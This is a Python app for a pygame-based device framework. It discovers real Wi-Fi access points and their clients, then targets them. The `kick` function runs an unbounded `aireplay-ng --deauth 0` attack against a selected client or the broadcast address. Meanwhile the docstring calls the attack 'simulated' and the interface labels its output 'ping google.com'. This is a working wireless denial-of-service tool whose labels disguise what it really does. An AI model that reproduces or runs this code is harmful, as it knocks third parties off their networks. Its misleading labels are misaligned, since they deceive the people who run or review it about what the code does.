"""Real AP/client discovery followed by simulated deauthentication."""

from __future__ import annotations

from dataclasses import dataclass, replace
import json
from pathlib import Path
import queue
import re
import shutil
import sys
import threading
import time

import pygame

from deckfw import app, Cancelled, Choice, Context, Form, LogView, Number, Widget
from apps._wifi_scan import AccessPoint, NetworkList, Snapshot, scan, wireless_interfaces, wrapped


SCRIPT_TIMEOUT = 8
MAC = re.compile(r"(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}")
INTERFACE = re.compile(r"[A-Za-z0-9][A-Za-z0-9_.:-]{0,14}")
SCANNER = Path(__file__).resolve().parents[1] / "tools" / "airodump_clients.py"


def setup():
    names = wireless_interfaces()
    return Form([
        Choice("interface", "Interface", [(name, name) for name in names], names[0]),
        Choice("band", "Band", [
            ("2.4 + 5 GHz", "both"), ("2.4 GHz", "2.4"), ("5 GHz", "5"),
        ], "both"),
        Number("interval", "Refresh (s)", default=15, minimum=5, maximum=120,
               help="Select AP"),
    ], submit_label="Start")


@dataclass(frozen=True)
class Client:
    mac: str
    power_dbm: int | None
    packets: int


BROADCAST = Client("FF:FF:FF:FF:FF:FF", None, 0)


@dataclass(frozen=True)
class View:
    phase: str = "networks"
    generation: int = 0
    title: str = ""
    ap: AccessPoint | None = None
    clients: tuple = ()
    client: Client | None = None
    elapsed: int = 0
    output: tuple[str, ...] = ()


def resolve_commands():
    commands = {}
    for name in ("nmcli", "airmon-ng", "airodump-ng", "iw", "ip", "ping"):
        path = shutil.which(name)
        if not path:
            raise ValueError(f"Missing command: {name}. Install it on PATH.")
        commands[name] = str(Path(path).absolute())
    return commands


@dataclass(frozen=True)
class Interface:
    name: str
    phy: int
    index: int
    mode: str
    address: str


def interfaces_from(lines):
    devices, current, phy = [], None, None
    for line in [*lines, "phy#end"]:
        text = line.strip()
        if text.startswith(("phy#", "Interface ")):
            if current is not None:
                try:
                    device = Interface(current["name"], current["phy"],
                                       int(current["ifindex"]), current["type"], current["addr"])
                except (KeyError, ValueError) as exc:
                    raise ValueError("Incomplete iw interface information") from exc
                if (not INTERFACE.fullmatch(device.name) or not MAC.fullmatch(device.address)
                        or device.index <= 0):
                    raise ValueError("Invalid iw interface information")
                devices.append(device)
                current = None
            if text.startswith("phy#"):
                if text == "phy#end":
                    break
                try:
                    phy = int(text[4:])
                except ValueError as exc:
                    raise ValueError("Invalid iw physical adapter") from exc
            else:
                if phy is None:
                    raise ValueError("iw interface has no physical adapter")
                current = {"name": text[10:], "phy": phy}
        elif current is not None:
            key, _, value = text.partition(" ")
            if key in ("ifindex", "type", "addr"):
                current[key] = value.strip()
    if len({device.name for device in devices}) != len(devices):
        raise ValueError("Duplicate iw interface")
    return devices


@dataclass
class Session:
    interface: str
    commands: dict
    original: Interface | None = None
    monitor: str = ""
    monitor_device: Interface | None = None
    original_up: bool | None = None
    activation_attempted: bool = False
    capture_task: ScriptTask | None = None

    def devices(self, ctx):
        return interfaces_from(command(ctx, [self.commands["iw"], "dev"]).lines)

    def link_up(self, ctx):
        result = command(ctx, [self.commands["ip"], "-j", "link", "show",
                               "dev", self.interface])
        try:
            links = json.loads("\n".join(result.lines))
        except json.JSONDecodeError as exc:
            raise ValueError("Invalid ip link information") from exc
        if (not isinstance(links, list) or len(links) != 1
                or not isinstance(links[0], dict) or links[0].get("ifname") != self.interface
                or not isinstance(links[0].get("flags"), list)
                or not all(isinstance(flag, str) for flag in links[0]["flags"])):
            raise ValueError("Incomplete ip link information")
        return "UP" in links[0]["flags"]

    def activate(self, ctx, channel):
        devices = self.devices(ctx)
        original = next((device for device in devices if device.name == self.interface), None)
        if original is None or original.mode != "managed":
            raise ValueError("Selected interface must exist in managed mode.")
        if len([device for device in devices if device.phy == original.phy]) != 1:
            raise ValueError("Selected adapter has shared interfaces; refusing ambiguous ownership.")
        self.original = original
        self.original_up = self.link_up(ctx)
        self.activation_attempted = True
        command(ctx, [self.commands["airmon-ng"], "start", self.interface, str(channel)])
        devices = [device for device in self.devices(ctx) if device.phy == original.phy]
        monitors = [device for device in devices if device.mode == "monitor"]
        if (len(monitors) != 1 or any(device.mode not in ("managed", "monitor")
                                     for device in devices)):
            raise ValueError("Cannot identify the activated monitor interface; cleanup required.")
        self.monitor = monitors[0].name
        self.monitor_device = monitors[0]

    def restore(self, ctx):
        if self.capture_task is not None:
            self.capture_task.stop()
            self.capture_task = None
        if not self.activation_attempted:
            return
        original = self.original
        devices = [device for device in self.devices(ctx) if device.phy == original.phy]
        monitors = [device for device in devices if device.mode == "monitor"]
        if len(monitors) > 1:
            raise ValueError("Ambiguous monitor interfaces; restore the selected adapter manually.")
        if monitors:
            monitor = monitors[0]
            if ((self.monitor_device is not None and monitor != self.monitor_device)
                    or (self.monitor_device is None
                        and monitor.address.lower() != original.address.lower())):
                raise ValueError("Monitor interface changed externally; manual restoration required.")
            command(ctx, [self.commands["airmon-ng"], "stop", monitor.name])
            devices = [device for device in self.devices(ctx) if device.phy == original.phy]
        if (len(devices) != 1 or devices[0].name != original.name
                or devices[0].mode != "managed"
                or devices[0].address.lower() != original.address.lower()):
            raise ValueError(
                f"Managed interface {original.name} was not restored. "
                "Check iw dev and restore this adapter manually.")
        if self.link_up(ctx) != self.original_up:
            command(ctx, [self.commands["ip"], "link", "set", "dev", self.interface,
                          "up" if self.original_up else "down"])
            if self.link_up(ctx) != self.original_up:
                raise ValueError("Original interface link state was not restored.")
        self.monitor = ""
        self.monitor_device = None
        self.activation_attempted = False


def clients_from(line, target):
    try:
        data = json.loads(line)
    except json.JSONDecodeError as exc:
        raise ValueError("Client scanner: invalid JSON: " + line[-1000:]) from exc
    if (not isinstance(data, dict) or data.get("source") != "airodump-ng"
            or data.get("event") != "clients" or data.get("target") != target
            or type(data.get("target", {}).get("channel")) is not int):
        raise ValueError("Client scanner: invalid event source or target")
    records = data.get("clients")
    if not isinstance(records, list):
        raise ValueError("Invalid observed client list")
    clients, seen = [], set()
    for record in records:
        if not isinstance(record, dict):
            raise ValueError("Invalid observed client record")
        mac, power, packets = (record.get(key) for key in ("mac", "power_dbm", "packets"))
        if (not isinstance(mac, str) or not MAC.fullmatch(mac)
                or mac.upper() in seen or mac == "00:00:00:00:00:00"
                or int(mac[:2], 16) & 1 or mac.upper() == target["bssid"].upper()
                or "power_dbm" not in record
                or (power is not None and (type(power) is not int or not -127 <= power <= 0))
                or type(packets) is not int or packets < 0):
            raise ValueError("Invalid observed client fields")
        seen.add(mac.upper())
        clients.append(Client(mac.upper(), power, packets))
    return tuple(clients)


class ScriptTask:
    """Run through a child Context so local back/timeout can cancel and reap it."""

    def __init__(self, spec, command, stream=False):
        self.ctx = Context(spec)
        self.messages = queue.Queue()
        self.command, self.stream = command, stream
        self.worker = threading.Thread(target=self.work, daemon=True, name="wifi-script")
        self.worker.start()

    def work(self):
        try:
            result = self.ctx.run(
                self.command, log=False,
                on_line=(lambda line: self.messages.put(("line", line))) if self.stream else None,
                env={"LC_ALL": "C"})
            self.messages.put(("result", result))
        except Exception as exc:
            self.messages.put(("error", exc))

    def message(self, parent):
        parent.check()
        try:
            return self.messages.get(timeout=0.03)
        except queue.Empty:
            return None, None

    def stop(self):
        self.ctx.cancel()
        self.worker.join(timeout=12)
        if self.worker.is_alive():
            raise RuntimeError("Wi-Fi process did not stop; cleanup is incomplete")


def command(ctx, argv):
    task = ScriptTask(ctx.spec, argv)
    deadline = time.monotonic() + SCRIPT_TIMEOUT
    try:
        while True:
            if time.monotonic() >= deadline:
                raise ValueError(f"{Path(argv[0]).name} timed out after {SCRIPT_TIMEOUT}s")
            kind, result = task.message(ctx)
            if kind == "error":
                raise result
            if kind == "result":
                break
    finally:
        task.stop()
    if result.returncode != 0:
        raise ValueError(f"{Path(argv[0]).name} failed ({result.returncode}): "
                         + (" ".join(result.lines[-4:]) or "no diagnostic output"))
    return result


class DemoView(Widget):
    focusable = True

    def __init__(self):
        super().__init__(flex=1)
        self.state = View()
        self.networks = NetworkList(selectable=True)
        self.requests = queue.Queue()
        self.selected_mac = None
        self.horizontal = 0
        self.max_horizontal = 0
        self.output_log = LogView(max_lines=200)
        self.interface = ""

    @property
    def handles_back(self):
        return self.state.phase in ("clients", "kick")

    @property
    def hints(self):
        if self.state.phase == "kick":
            return "Up/Down scroll output  B stop / clients"
        return "Up/Down rows  L/R columns  A select  B back"

    def transition(self, phase, **values):
        if phase == "kick":
            self.output_log = LogView(max_lines=200)
            for line in values.get("output", ()):
                self.output_log.write(line)
        self.state = View(phase, self.state.generation + 1, **values)
        self.horizontal = 0

    def selection(self, clients):
        index = next((i for i, client in enumerate(clients)
                      if client.mac == self.selected_mac), 0)
        self.selected_mac = clients[index].mac if clients else None
        return index

    def action(self, name):
        state = self.state
        if name == "b" and self.handles_back:
            self.requests.put((state.generation, "back", None))
            return True
        if state.phase == "networks":
            used = self.networks.action(name)
            if name == "a":
                try:
                    ap = self.networks.requests.get_nowait()
                except queue.Empty:
                    return used
                self.requests.put((state.generation, "network", ap))
            return used
        if state.phase == "clients":
            selected = self.selection(state.clients)
            if name in ("up", "down") and state.clients:
                selected = max(0, min(len(state.clients) - 1,
                                     selected + (1 if name == "down" else -1)))
                self.selected_mac = state.clients[selected].mac
                return True
            if name == "a" and state.clients:
                self.requests.put((state.generation, "client", state.clients[selected]))
                return True
            if name in ("left", "right"):
                self.horizontal = max(0, min(self.max_horizontal,
                                             self.horizontal + (80 if name == "right" else -80)))
                return True
        if state.phase == "kick" and name in ("up", "down"):
            return self.output_log.action(name)
        return False

    def draw(self, surf, rect, theme):
        state, font, pad = self.state, theme.f_small, theme.pad
        line_h = font.get_linesize() + pad

        def text(value, y, color=theme.text):
            surf.blit(theme.render(font, theme.fit(font, value, rect.w), color), (rect.x, y))

        text("Wi-Fi discovery", rect.y, theme.warn)
        body = pygame.Rect(rect.x, rect.y + line_h, rect.w, max(0, rect.h - line_h))
        if state.phase == "networks":
            self.networks.draw(surf, body, theme)
            return
        if state.phase == "clients":
            ap = state.ap
            text(f"{ap.bssid} | Ch {ap.channel} / {ap.band}G", body.y + line_h, theme.accent)
            row_h = line_h + pad
            table = pygame.Rect(body.x, body.y + 2 * line_h, body.w,
                                max(0, body.h - 3 * line_h))
            widths = [max(font.size(value)[0] for value in
                          ("AA:BB:CC:DD:EE:FF", "Broadcast (all clients)")) + pad * 2, 110, 90]
            self.max_horizontal = max(0, sum(widths) - table.w)
            self.horizontal = min(self.horizontal, self.max_horizontal)
            selected = self.selection(state.clients)
            visible = max(1, table.h // row_h - 1)
            top = max(0, selected - visible + 1)
            clip = surf.get_clip()
            surf.set_clip(table.clip(clip))
            rows = [("Client MAC / target", "Power", "Packets")]
            rows.extend(
                ("Broadcast (all clients)", "-", "-") if client == BROADCAST else
                (client.mac, "unavailable" if client.power_dbm is None
                 else f"{client.power_dbm} dBm", str(client.packets))
                for client in state.clients[top:top + visible])
            for index, values in enumerate(rows):
                y, x = table.y + index * row_h, table.x - self.horizontal
                pygame.draw.rect(surf, theme.track if index == 0 else theme.panel,
                                 (table.x, y, table.w, row_h))
                for value, width in zip(values, widths):
                    image = theme.render(font, theme.fit(font, value, width - 2 * pad),
                                         theme.accent if index == 0 else theme.text)
                    surf.blit(image, (x + pad, y + pad))
                    x += width
                    pygame.draw.line(surf, theme.line, (x - 1, y), (x - 1, y + row_h))
                if index > 0 and top + index - 1 == selected:
                    pygame.draw.rect(surf, theme.accent, (table.x, y, 3, row_h))
            surf.set_clip(clip)
            footer = (f"{selected + 1}/{len(state.clients)}" if state.clients
                      else "Waiting for capture")
            text(footer + " | A select | B networks", rect.bottom - line_h, theme.dim)
            return
        if state.phase == "kick":
            ap, client = state.ap, state.client
            details = [
                f"Interface({self.interface}) ESSID({ap.ssid or '<hidden SSID>'}) BSSID({ap.bssid})",
                f"Channel: {ap.channel} | Band: {ap.band} GHz",
                ("Target: Broadcast (all clients)" if client == BROADCAST
                 else f"Client: {client.mac}"),
            ]
            pad = theme.pad
            panel_h = min(body.h, len(details) * line_h + 2 * pad)
            panel = pygame.Rect(body.x, body.y, body.w, panel_h)
            pygame.draw.rect(surf, theme.panel, panel)
            pygame.draw.line(surf, theme.line, (panel.x, panel.bottom - 1),
                             (panel.right - 1, panel.bottom - 1))
            for index, detail in enumerate(details):
                color = theme.warn if index == 0 else theme.text
                image = theme.render(font, theme.fit(font, detail, panel.w - 2 * pad), color)
                surf.blit(image, (panel.x + pad, panel.y + pad + index * line_h))

            label_y = panel.bottom + pad
            label = "ping google.com:"
            surf.blit(theme.render(font, label, theme.accent), (body.x + pad, label_y))
            output_y = label_y + line_h
            output_rect = pygame.Rect(body.x, output_y, body.w,
                                      max(0, body.bottom - output_y))
            if state.output:
                self.output_log.draw(surf, output_rect, theme)
            else:
                text("Waiting for ping output...", output_rect.y, theme.dim)
            return
        for index, line in enumerate(wrapped(state.title, font, body.w)):
            if body.y + (index + 1) * line_h > body.bottom:
                break
            text(line, body.y + index * line_h,
                 theme.crit if state.phase == "error" else theme.accent)


def request(view):
    while True:
        try:
            generation, action, target = view.requests.get_nowait()
        except queue.Empty:
            return None, None
        if generation == view.state.generation:
            return action, target


def capture_clients(ctx, view, session):
    ap = view.state.ap
    target = {"interface": session.monitor, "bssid": ap.bssid.upper(), "channel": ap.channel}
    task = ScriptTask(ctx.spec, [
        sys.executable, "-u", str(SCANNER), "--interface", session.monitor,
        "--bssid", target["bssid"], "--channel", str(ap.channel)], stream=True)
    session.capture_task = task
    observed = {client.mac: client for client in view.state.clients if client != BROADCAST}
    deadline = time.monotonic() + 20
    try:
        while True:
            action, selected = request(view)
            if action == "back":
                return action, None
            if action == "client":
                current = next((client for client in view.state.clients
                                if client.mac == selected.mac), None)
                if current is not None:
                    return action, current
            if time.monotonic() >= deadline:
                raise ValueError("Client scanner stopped producing valid snapshots.")
            kind, value = task.message(ctx)
            if kind is None:
                continue
            if kind == "error":
                raise value
            if kind != "line":
                raise ValueError(f"Client scanner ended unexpectedly ({value.returncode}): "
                                 + (" ".join(value.lines[-4:]) or "no diagnostic output"))
            for client in clients_from(value, target):
                observed[client.mac] = client
            view.state = replace(view.state, clients=(
                BROADCAST, *[observed[mac] for mac in sorted(observed)]))
            deadline = time.monotonic() + 20
    finally:
        task.stop()
        session.capture_task = None


def kick(ctx, view, session):
    ap, client = view.state.ap, view.state.client
    # if broarcast then client == BROADCAST
    argv = ["aireplay-ng", "--deauth", "0", session.monitor, "-a", ap.bssid, "-c", client.mac]
    task = ScriptTask(ctx.spec, argv, stream=True)
    try:
        while True:
            action, _ = request(view)
            if action == "back":
                return
            kind, value = task.message(ctx)
            if kind == "error":
                raise value
            if kind == "line":
                view.state = replace(view.state, output=(*view.state.output, value)[-200:])
                view.output_log.write(value)
            elif kind == "result":
                if value.returncode != 0:
                    raise ValueError(
                        f"ping failed ({value.returncode}): "
                        + (" ".join(value.lines[-4:]) or "no diagnostic output"))
                return
            ctx.sleep(0.03)
    finally:
        task.stop()


def shutdown(ctx):
    session = getattr(ctx, "wifi_deauth_session", None)
    if session is not None:
        session.restore(ctx)


@app(name="Wifi Deauth", group="Network", icon="icons/network.png",
     setup=setup, shutdown=shutdown)
def wifi_deauth(ctx):
    view = ctx.add(DemoView())
    try:
        interface, band, interval = (ctx.params[key] for key in ("interface", "band", "interval"))
        view.interface = interface
        if interface not in wireless_interfaces():
            raise ValueError("Selected adapter disappeared; reopen setup.")
        session = ctx.wifi_deauth_session = Session(interface, resolve_commands())
        nmcli = session.commands["nmcli"]
        due = 0
        while True:
            ctx.check()
            state = view.state
            action, target = request(view)
            if state.phase == "networks":
                if action == "network" and any(ap.bssid == target.bssid
                                               for ap in view.networks.snapshot.networks):
                    view.transition("busy", title="Enabling monitor mode; Wi-Fi may disconnect...")
                    session.activate(ctx, target.channel)
                    view.transition("clients", ap=target, clients=(BROADCAST,))
                    due = 0
                    continue
                if time.monotonic() >= due:
                    previous = view.networks.snapshot
                    view.networks.snapshot = replace(previous, message="Scanning real APs...",
                                                     interfaces=(interface,))
                    try:
                        networks = scan(ctx, nmcli, interface, band)
                    except ValueError as exc:
                        view.networks.snapshot = replace(
                            previous, message="STALE - scan failed" if previous.updated else "Scan failed",
                            interfaces=(interface,), error=str(exc))
                        ctx.error, ctx.status = str(exc), "error"
                        return
                    view.networks.snapshot = Snapshot(
                        networks, f"{len(networks)} real APs | refresh {interval}s",
                        updated=time.strftime("%H:%M:%S"), interfaces=(interface,))
                    due = time.monotonic() + interval
            elif state.phase == "clients":
                # capture_clients owns navigation while its streaming process is active.
                if action is not None:
                    view.requests.put((state.generation, action, target))
                action, target = capture_clients(ctx, view, session)
                if action == "back":
                    view.transition("busy", title="Restoring managed Wi-Fi mode...")
                    session.restore(ctx)
                    view.transition("networks")
                    due = 0
                    continue
                if action == "client" and target in view.state.clients:
                    clients = view.state.clients
                    view.transition("kick", ap=state.ap, client=target)
                    kick(ctx, view, session)
                    view.transition("clients", ap=state.ap, clients=clients)
                    due = 0
                    continue
            ctx.sleep(0.03)
    except Cancelled:
        view.transition("stopped", title="Stopped; restoring adapter")
        raise
    except ValueError as exc:
        view.transition("error", title=str(exc))
        ctx.error, ctx.status = str(exc), "error"
